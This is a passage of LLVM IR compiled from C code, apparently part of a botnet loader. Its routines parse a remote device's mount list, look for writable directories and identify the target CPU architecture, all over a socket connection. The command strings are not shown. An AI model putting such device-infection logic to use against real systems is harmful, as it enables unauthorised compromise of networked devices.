  br i1 %49, label %.lr.ph131.us, label %._crit_edge132.us

; <label>:50:                                     ; preds = %29, %26
  %51 = load i32, i32* %8, align 8
  %52 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %51, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0), i32 %22)
  br label %.thread.us

.thread.us.loopexit:                              ; preds = %42
  br label %.thread.us

.thread.us:                                       ; preds = %.thread.us.loopexit, %14, %50, %36, %._crit_edge132.us, %32, %21, %._crit_edge.us
  %53 = getelementptr inbounds i8, i8* %12, i64 1
  br label %.split.us

.lr.ph127.us:                                     ; preds = %.lr.ph127.us.preheader, %62
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %62 ], [ 0, %.lr.ph127.us.preheader ]
  %.095126.us = phi i8* [ %.2.us, %62 ], [ null, %.lr.ph127.us.preheader ]
  %.097125.us = phi i8* [ %.299.us, %62 ], [ null, %.lr.ph127.us.preheader ]
  %.0100124.us = phi i8 [ %.1101.us, %62 ], [ 0, %.lr.ph127.us.preheader ]
  %.0102123.us = phi i8 [ %.3.us, %62 ], [ 0, %.lr.ph127.us.preheader ]
  %54 = getelementptr inbounds i8, i8* %.093.us155, i64 %indvars.iv135
  %55 = load i8, i8* %54, align 1
  switch i8 %55, label %58 [
    i8 32, label %56
    i8 9, label %56
    i8 0, label %56
  ]

; <label>:56:                                     ; preds = %.lr.ph127.us, %.lr.ph127.us, %.lr.ph127.us
  %notlhs.us = icmp ne i8 %.0102123.us, 0
  %notrhs.us = icmp eq i8 %.0100124.us, 0
  %not.or.cond.us = and i1 %notlhs.us, %notrhs.us
  %57 = zext i1 %not.or.cond.us to i8
  %.0102..us = add i8 %57, %.0102123.us
  store i8 0, i8* %54, align 1
  br label %62

; <label>:58:                                     ; preds = %.lr.ph127.us
  %59 = icmp eq i8 %.0102123.us, 0
  br i1 %59, label %62, label %60

; <label>:60:                                     ; preds = %58
  %.0102.off.us = add i8 %.0102123.us, -3
  %or.cond109.not.us = icmp ugt i8 %.0102.off.us, 2
  %61 = icmp eq i8 %.0100124.us, 0
  %or.cond110.us = or i1 %or.cond109.not.us, %61
  %.095..us = select i1 %or.cond110.us, i8* %.095126.us, i8* %54
  br label %62

; <label>:62:                                     ; preds = %60, %58, %56
  %.3.us = phi i8 [ %.0102..us, %56 ], [ %.0102123.us, %60 ], [ 1, %58 ]
  %.1101.us = phi i8 [ 1, %56 ], [ 0, %60 ], [ 0, %58 ]
  %.299.us = phi i8* [ %.097125.us, %56 ], [ %.097125.us, %60 ], [ %54, %58 ]
  %.2.us = phi i8* [ %.095126.us, %56 ], [ %.095..us, %60 ], [ %.095126.us, %58 ]
  %indvars.iv.next136 = add nuw nsw i64 %indvars.iv135, 1
  %exitcond = icmp eq i64 %indvars.iv.next136, %17
  br i1 %exitcond, label %._crit_edge.us, label %.lr.ph127.us

; <label>:63:                                     ; preds = %.lr.ph156
  store i8 0, i8* %12, align 1
  br label %.split.us

.split.us:                                        ; preds = %63, %.thread.us, %.lr.ph156
  %.194.us = phi i8* [ %.093.us155, %63 ], [ %53, %.thread.us ], [ %.093.us155, %.lr.ph156 ]
  %indvars.iv.next140 = add nuw i64 %indvars.iv139154, 1
  %.pre = load i16, i16* %3, align 8
  %64 = zext i16 %.pre to i64
  %65 = icmp slt i64 %indvars.iv.next140, %64
  br i1 %65, label %.lr.ph156, label %.us-lcssa.us.loopexit

.lr.ph131.us.preheader:                           ; preds = %32
  %sext150 = shl i64 %23, 32
  %66 = ashr exact i64 %sext150, 32
  br label %.lr.ph131.us

.lr.ph159:                                        ; preds = %.lr.ph159.preheader, %.split
  %.093158 = phi i8* [ %.194, %.split ], [ %2, %.lr.ph159.preheader ]
  %indvars.iv146157 = phi i64 [ %indvars.iv.next147, %.split ], [ 0, %.lr.ph159.preheader ]
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv146157
  %68 = load i8, i8* %67, align 1
  switch i8 %68, label %.split [
    i8 13, label %69
    i8 10, label %70
  ]

; <label>:69:                                     ; preds = %.lr.ph159
  store i8 0, i8* %67, align 1
  br label %.split

; <label>:70:                                     ; preds = %.lr.ph159
  store i8 0, i8* %67, align 1
  %71 = ptrtoint i8* %67 to i64
  %72 = ptrtoint i8* %.093158 to i64
  %73 = sub i64 %71, %72
  %74 = icmp sgt i64 %73, 0
  br i1 %74, label %.lr.ph127.preheader, label %.thread

.lr.ph127.preheader:                              ; preds = %70
  br label %.lr.ph127

.lr.ph127:                                        ; preds = %.lr.ph127.preheader, %83
  %indvars.iv141 = phi i64 [ %indvars.iv.next142, %83 ], [ 0, %.lr.ph127.preheader ]
  %.095126 = phi i8* [ %.2, %83 ], [ null, %.lr.ph127.preheader ]
  %.097125 = phi i8* [ %.299, %83 ], [ null, %.lr.ph127.preheader ]
  %.0100124 = phi i8 [ %.1101, %83 ], [ 0, %.lr.ph127.preheader ]
  %.0102123 = phi i8 [ %.3, %83 ], [ 0, %.lr.ph127.preheader ]
  %75 = getelementptr inbounds i8, i8* %.093158, i64 %indvars.iv141
  %76 = load i8, i8* %75, align 1
  switch i8 %76, label %79 [
    i8 32, label %77
    i8 9, label %77
    i8 0, label %77
  ]

; <label>:77:                                     ; preds = %.lr.ph127, %.lr.ph127, %.lr.ph127
  %notlhs = icmp ne i8 %.0102123, 0
  %notrhs = icmp eq i8 %.0100124, 0
  %not.or.cond = and i1 %notlhs, %notrhs
  %78 = zext i1 %not.or.cond to i8
  %.0102. = add i8 %78, %.0102123
  store i8 0, i8* %75, align 1
  br label %83

; <label>:79:                                     ; preds = %.lr.ph127
  %80 = icmp eq i8 %.0102123, 0
  br i1 %80, label %83, label %81

; <label>:81:                                     ; preds = %79
  %.0102.off = add i8 %.0102123, -3
  %or.cond109.not = icmp ugt i8 %.0102.off, 2
  %82 = icmp eq i8 %.0100124, 0
  %or.cond110 = or i1 %or.cond109.not, %82
  %.095. = select i1 %or.cond110, i8* %.095126, i8* %75
  br label %83

; <label>:83:                                     ; preds = %79, %81, %77
  %.3 = phi i8 [ %.0102., %77 ], [ %.0102123, %81 ], [ 1, %79 ]
  %.1101 = phi i8 [ 1, %77 ], [ 0, %81 ], [ 0, %79 ]
  %.299 = phi i8* [ %.097125, %77 ], [ %.097125, %81 ], [ %75, %79 ]
  %.2 = phi i8* [ %.095126, %77 ], [ %.095., %81 ], [ %.095126, %79 ]
  %indvars.iv.next142 = add nuw nsw i64 %indvars.iv141, 1
  %exitcond143 = icmp eq i64 %indvars.iv.next142, %73
  br i1 %exitcond143, label %._crit_edge, label %.lr.ph127

._crit_edge:                                      ; preds = %83
  %84 = icmp ne i8* %.299, null
  %85 = icmp ne i8* %.2, null
  %or.cond3 = and i1 %84, %85
  br i1 %or.cond3, label %86, label %.thread

; <label>:86:                                     ; preds = %._crit_edge
  %87 = tail call i32 @atoi(i8* nonnull %.299) #9
  %88 = tail call i64 @strlen(i8* nonnull %.2) #9
  %89 = trunc i64 %88 to i32
  %90 = icmp eq i32 %87, 1
  br i1 %90, label %.thread, label %91

; <label>:91:                                     ; preds = %86
  %92 = tail call i32 @strcmp(i8* nonnull %.2, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #9
  %93 = icmp eq i32 %92, 0
  br i1 %93, label %97, label %94

; <label>:94:                                     ; preds = %91
  %95 = tail call i32 @strcmp(i8* nonnull %.2, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0)) #9
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94, %91
  %98 = load i32, i32* %8, align 8
  %99 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %98, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0), i32 %87)
  br label %.thread

; <label>:100:                                    ; preds = %94
  %101 = icmp sgt i32 %87, 400
  %102 = icmp sgt i32 %89, 0
  %or.cond153 = and i1 %101, %102
  br i1 %or.cond153, label %.lr.ph131.preheader, label %.thread

.lr.ph131.preheader:                              ; preds = %100
  %sext = shl i64 %88, 32
  %103 = ashr exact i64 %sext, 32
  br label %.lr.ph131

.lr.ph131:                                        ; preds = %.lr.ph131.preheader, %113
  %indvars.iv144 = phi i64 [ 0, %.lr.ph131.preheader ], [ %indvars.iv.next145, %113 ]
  %.091130 = phi i32 [ 0, %.lr.ph131.preheader ], [ %.1, %113 ]
  %104 = getelementptr inbounds i8, i8* %.2, i64 %indvars.iv144
  %105 = load i8, i8* %104, align 1
  %.off = add i8 %105, -48
  %106 = icmp ult i8 %.off, 10
  br i1 %106, label %107, label %109

; <label>:107:                                    ; preds = %.lr.ph131
  %108 = add nsw i32 %.091130, 1
  br label %113

; <label>:109:                                    ; preds = %.lr.ph131
  %110 = and i8 %105, -33
  %111 = add i8 %110, -65
  %112 = icmp ult i8 %111, 26
  br i1 %112, label %.thread.loopexit, label %113

; <label>:113:                                    ; preds = %109, %107
  %.1 = phi i32 [ %108, %107 ], [ %.091130, %109 ]
  %indvars.iv.next145 = add nuw nsw i64 %indvars.iv144, 1
  %114 = icmp slt i64 %indvars.iv.next145, %103
  br i1 %114, label %.lr.ph131, label %._crit_edge132

._crit_edge132:                                   ; preds = %113
  %115 = icmp sgt i32 %.1, 0
  br i1 %115, label %116, label %.thread

; <label>:116:                                    ; preds = %._crit_edge132
  %117 = load i32, i32* %8, align 8
  %118 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %117, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0), i32 %87)
  br label %.thread

.thread.loopexit:                                 ; preds = %109
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %70, %86, %97, %._crit_edge132, %116, %100, %._crit_edge
  %119 = getelementptr inbounds i8, i8* %67, i64 1
  br label %.split

.split:                                           ; preds = %.lr.ph159, %69, %.thread
  %.194 = phi i8* [ %.093158, %69 ], [ %119, %.thread ], [ %.093158, %.lr.ph159 ]
  %indvars.iv.next147 = add nuw nsw i64 %indvars.iv146157, 1
  %120 = icmp slt i64 %indvars.iv.next147, %10
  br i1 %120, label %.lr.ph159, label %.us-lcssa.us.loopexit134.loopexit

.us-lcssa.us.loopexit134.loopexit:                ; preds = %.split
  br label %.us-lcssa.us.loopexit134

.us-lcssa.us.loopexit134:                         ; preds = %.us-lcssa.us.loopexit134.loopexit, %.split.preheader
  %.pre148 = load i16, i16* %3, align 8
  br label %.us-lcssa.us

.us-lcssa.us.loopexit:                            ; preds = %.split.us
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit, %.split.us.preheader, %.us-lcssa.us.loopexit134
  %121 = phi i16 [ %.pre148, %.us-lcssa.us.loopexit134 ], [ %4, %.split.us.preheader ], [ %.pre, %.us-lcssa.us.loopexit ]
  br i1 %7, label %123, label %.preheader

.preheader:                                       ; preds = %.us-lcssa.us
  %122 = icmp eq i16 %121, 0
  br i1 %122, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:123:                                    ; preds = %.us-lcssa.us
  %124 = icmp ugt i16 %121, 7168
  br i1 %124, label %125, label %.loopexit

; <label>:125:                                    ; preds = %123
  %126 = zext i16 %121 to i64
  %127 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 6144
  %128 = add nsw i64 %126, -6144
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %2, i8* %127, i64 %128, i32 1, i1 false)
  %129 = add i16 %121, -6144
  store i16 %129, i16* %3, align 8
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %135
  %130 = phi i16 [ %136, %135 ], [ %121, %.lr.ph.preheader ]
  %indvars.iv = phi i64 [ %indvars.iv.next, %135 ], [ 0, %.lr.ph.preheader ]
  %131 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %132 = load i8, i8* %131, align 1
  %133 = icmp eq i8 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %.lr.ph
  store i8 32, i8* %131, align 1
  %.pre149 = load i16, i16* %3, align 8
  br label %135

; <label>:135:                                    ; preds = %.lr.ph, %134
  %136 = phi i16 [ %130, %.lr.ph ], [ %.pre149, %134 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %137 = zext i16 %136 to i64
  %138 = icmp slt i64 %indvars.iv.next, %137
  br i1 %138, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %135
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %123, %125
  %.092 = phi i32 [ 0, %125 ], [ 0, %123 ], [ %6, %.preheader ], [ %6, %.loopexit.loopexit ]
  ret i32 %.092
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_mounts(%struct.connection* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [256 x i8], align 16
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %5 = load i16, i16* %4, align 8
  %6 = zext i16 %5 to i32
  %7 = tail call i32 @util_memsearch(i8* %3, i32 %6, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %60, label %.preheader

.preheader:                                       ; preds = %1
  %9 = icmp sgt i32 %7, 0
  br i1 %9, label %.lr.ph, label %.preheader.._crit_edge_crit_edge

.preheader.._crit_edge_crit_edge:                 ; preds = %.preheader
  %.pre = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  br label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 0
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %12 = sext i32 %7 to i64
  br label %13

; <label>:13:                                     ; preds = %.lr.ph, %54
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %54 ]
  %.03844 = phi i32 [ 0, %.lr.ph ], [ %.1, %54 ]
  %.03943 = phi i32 [ 0, %.lr.ph ], [ %.140, %54 ]
  %14 = sext i32 %.03844 to i64
  %15 = icmp eq i32 %.03844, 255
  br i1 %15, label %._crit_edge.loopexit, label %16

; <label>:16:                                     ; preds = %13
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %18 = load i8, i8* %17, align 1
  switch i8 %18, label %51 [
    i8 10, label %19
    i8 32, label %45
    i8 9, label %45
    i8 13, label %54
  ]

; <label>:19:                                     ; preds = %16
  %20 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 %14
  store i8 0, i8* %20, align 1
  %21 = call i8* @strtok(i8* nonnull %10, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %22 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %23 = icmp eq i8* %22, null
  br i1 %23, label %54, label %24

; <label>:24:                                     ; preds = %19
  %25 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %26 = icmp eq i8* %25, null
  br i1 %26, label %54, label %27

; <label>:27:                                     ; preds = %24
  %28 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0)) #7
  %29 = icmp eq i8* %28, null
  br i1 %29, label %54, label %30

; <label>:30:                                     ; preds = %27
  %31 = call i64 @strlen(i8* nonnull %22) #9
  %32 = add i64 %31, -1
  %33 = getelementptr inbounds i8, i8* %22, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = icmp eq i8 %34, 47
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i8 0, i8* %33, align 1
  br label %37

; <label>:37:                                     ; preds = %36, %30
  %38 = call i64 @strlen(i8* nonnull %28) #9
  %39 = trunc i64 %38 to i32
  %40 = call i32 @util_memsearch(i8* nonnull %28, i32 %39, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i32 2)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %54, label %42

; <label>:42:                                     ; preds = %37
  %43 = load i32, i32* %11, align 8
  %44 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %43, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0), i8* nonnull %22, i8* nonnull %22, i8* nonnull %22, i8* nonnull %22, i8* nonnull %22)
  br label %54

; <label>:45:                                     ; preds = %16, %16
  %46 = add nsw i32 %.03943, 1
  %47 = icmp eq i32 %.03943, 0
  br i1 %47, label %48, label %54

; <label>:48:                                     ; preds = %45
  %49 = add nsw i32 %.03844, 1
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 %14
  store i8 %18, i8* %50, align 1
  br label %54

; <label>:51:                                     ; preds = %16
  %52 = add nsw i32 %.03844, 1
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %2, i64 0, i64 %14
  store i8 %18, i8* %53, align 1
  br label %54

; <label>:54:                                     ; preds = %16, %19, %24, %27, %42, %37, %51, %45, %48
  %.140 = phi i32 [ %46, %48 ], [ %46, %45 ], [ 0, %51 ], [ %.03943, %37 ], [ %.03943, %42 ], [ %.03943, %27 ], [ %.03943, %24 ], [ %.03943, %19 ], [ %.03943, %16 ]
  %.1 = phi i32 [ %49, %48 ], [ %.03844, %45 ], [ %52, %51 ], [ 0, %37 ], [ 0, %42 ], [ 0, %27 ], [ 0, %24 ], [ 0, %19 ], [ %.03844, %16 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %55 = icmp slt i64 %indvars.iv.next, %12
  br i1 %55, label %13, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %13, %54
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader.._crit_edge_crit_edge
  %.pre-phi = phi i32* [ %.pre, %.preheader.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %56 = load i32, i32* %.pre-phi, align 8
  %57 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %56, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0))
  %58 = load i32, i32* %.pre-phi, align 8
  %59 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %58, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i64 0, i64 0))
  br label %60

; <label>:60:                                     ; preds = %1, %._crit_edge
  %.0 = phi i32 [ %7, %._crit_edge ], [ 0, %1 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_written_dirs(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %.loopexit, label %.preheader

.preheader:                                       ; preds = %1
  %8 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %.loopexit, label %.lr.ph.lr.ph

.lr.ph.lr.ph:                                     ; preds = %.preheader
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 3, i64 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.lr.ph, %.outer.backedge
  %12 = phi i32 [ %8, %.lr.ph.lr.ph ], [ %58, %.outer.backedge ]
  %.026.ph33 = phi i32 [ 0, %.lr.ph.lr.ph ], [ %15, %.outer.backedge ]
  %.027.ph32 = phi i8 [ 0, %.lr.ph.lr.ph ], [ %.027.ph.be, %.outer.backedge ]
  %13 = icmp eq i8 %.027.ph32, 0
  br i1 %13, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %.backedge.us
  %14 = phi i32 [ %33, %.backedge.us ], [ %12, %.lr.ph.split.us.preheader ]
  %.02630.us = phi i32 [ %15, %.backedge.us ], [ %.026.ph33, %.lr.ph.split.us.preheader ]
  %15 = add nsw i32 %14, %.02630.us
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %16
  %18 = tail call i8* @strtok(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0)) #7
  %19 = icmp eq i8* %18, null
  br i1 %19, label %.backedge.us, label %20

; <label>:20:                                     ; preds = %.lr.ph.split.us
  %21 = tail call i64 @strlen(i8* nonnull %18) #9
  %22 = shl i64 %21, 32
  %sext.us = add i64 %22, -4294967296
  %23 = ashr exact i64 %sext.us, 32
  %24 = getelementptr inbounds i8, i8* %18, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = icmp eq i8 %25, 13
  br i1 %26, label %27, label %.us-lcssa.us

; <label>:27:                                     ; preds = %20
  store i8 0, i8* %24, align 1
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %27, %20
  %28 = load i32, i32* %10, align 8
  %29 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %28, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i64 0, i64 0), i8* nonnull %18, i8* nonnull %18, i8* nonnull %18)
  %30 = trunc i64 %21 to i32
  %31 = icmp slt i32 %30, 31
  br i1 %31, label %55, label %60

.backedge.us:                                     ; preds = %.lr.ph.split.us
  %32 = sub nsw i32 %6, %15
  %33 = tail call i32 @util_memsearch(i8* %17, i32 %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %.loopexit.loopexit68, label %.lr.ph.split.us

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %.backedge
  %35 = phi i32 [ %42, %.backedge ], [ %12, %.lr.ph.split.preheader ]
  %.02630 = phi i32 [ %36, %.backedge ], [ %.026.ph33, %.lr.ph.split.preheader ]
  %36 = add nsw i32 %35, %.02630
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %37
  %39 = tail call i8* @strtok(i8* %38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0)) #7
  %40 = icmp eq i8* %39, null
  br i1 %40, label %.backedge, label %44

.backedge:                                        ; preds = %52, %.lr.ph.split
  %41 = sub nsw i32 %6, %36
  %42 = tail call i32 @util_memsearch(i8* %38, i32 %41, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %.loopexit.loopexit, label %.lr.ph.split

; <label>:44:                                     ; preds = %.lr.ph.split
  %45 = tail call i64 @strlen(i8* nonnull %39) #9
  %46 = shl i64 %45, 32
  %sext = add i64 %46, -4294967296
  %47 = ashr exact i64 %sext, 32
  %48 = getelementptr inbounds i8, i8* %39, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = icmp eq i8 %49, 13
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %44
  store i8 0, i8* %48, align 1
  br label %52

; <label>:52:                                     ; preds = %51, %44
  %53 = load i32, i32* %10, align 8
  %54 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %53, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i64 0, i64 0), i8* nonnull %39, i8* nonnull %39, i8* nonnull %39)
  br label %.backedge

; <label>:55:                                     ; preds = %.us-lcssa.us
  %56 = tail call i8* @strcpy(i8* nonnull %11, i8* nonnull %18) #7
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %55, %60
  %.027.ph.be = phi i8 [ 0, %60 ], [ 1, %55 ]
  %57 = sub nsw i32 %6, %15
  %58 = tail call i32 @util_memsearch(i8* nonnull %17, i32 %57, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i32 4)
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %.loopexit.loopexit69, label %.lr.ph

; <label>:60:                                     ; preds = %.us-lcssa.us
  tail call void @connection_close(%struct.connection* nonnull %0)
  br label %.outer.backedge

.loopexit.loopexit:                               ; preds = %.backedge
  br label %.loopexit

.loopexit.loopexit68:                             ; preds = %.backedge.us
  br label %.loopexit

.loopexit.loopexit69:                             ; preds = %.outer.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit69, %.loopexit.loopexit68, %.loopexit.loopexit, %.preheader, %1
  %.0 = phi i32 [ 0, %1 ], [ %6, %.preheader ], [ %6, %.loopexit.loopexit ], [ %6, %.loopexit.loopexit68 ], [ %6, %.loopexit.loopexit69 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_copy_op(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arch(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 8
  %3 = load i8, i8* %2, align 1
  %4 = icmp eq i8 %3, 0
  %5 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  br i1 %4, label %9, label %54

; <label>:9:                                      ; preds = %1
  %10 = tail call i32 @util_memsearch(i8* %5, i32 %8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0), i32 3)
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %64, label %12

; <label>:12:                                     ; preds = %9
  %13 = add nsw i32 %10, -4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %14
  store i8 1, i8* %2, align 1
  %16 = getelementptr inbounds i8, i8* %15, i64 5
  %17 = load i8, i8* %16, align 1
  switch i8 %17, label %._crit_edge [
    i8 0, label %64
    i8 2, label %18
  ]

._crit_edge:                                      ; preds = %12
  %.phi.trans.insert = getelementptr inbounds i8, i8* %15, i64 18
  %.phi.trans.insert41 = bitcast i8* %.phi.trans.insert to i16*
  %.pre = load i16, i16* %.phi.trans.insert41, align 1
  br label %25

; <label>:18:                                     ; preds = %12
  %19 = getelementptr inbounds i8, i8* %15, i64 18
  %20 = bitcast i8* %19 to i16*
  %21 = load i16, i16* %20, align 1
  %22 = zext i16 %21 to i32
  %23 = tail call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %22) #7
  %24 = trunc i32 %23 to i16
  store i16 %24, i16* %20, align 1
  br label %25

; <label>:25:                                     ; preds = %._crit_edge, %18
  %26 = phi i16 [ %.pre, %._crit_edge ], [ %24, %18 ]
  switch i16 %26, label %47 [
    i16 40, label %27
    i16 183, label %27
    i16 8, label %30
    i16 10, label %30
    i16 3, label %36
    i16 6, label %36
    i16 7, label %36
    i16 62, label %36
    i16 2, label %39
    i16 18, label %39
    i16 43, label %39
    i16 4, label %42
    i16 5, label %42
    i16 20, label %44
    i16 21, label %44
  ]

; <label>:27:                                     ; preds = %25, %25
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
